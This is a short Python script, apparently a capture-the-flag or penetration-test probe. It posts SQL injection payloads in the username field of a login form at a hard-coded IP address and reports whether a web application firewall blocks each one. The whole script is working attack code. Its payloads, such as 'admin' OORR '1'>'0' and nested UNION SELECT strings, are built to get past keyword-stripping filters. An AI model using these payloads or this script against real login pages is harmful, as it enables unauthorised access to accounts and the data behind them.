import requests
def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php", data={"username": payload, "password": "x"})
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:30}] waf={waf}")

test("admin' OORR '1'>'0", "nested-or")
test("admin' UNIunionON SELselectECT 1", "nested-union-select")
test("admin' UNIONunion SELECTselect 1", "nested-union-select-v2")
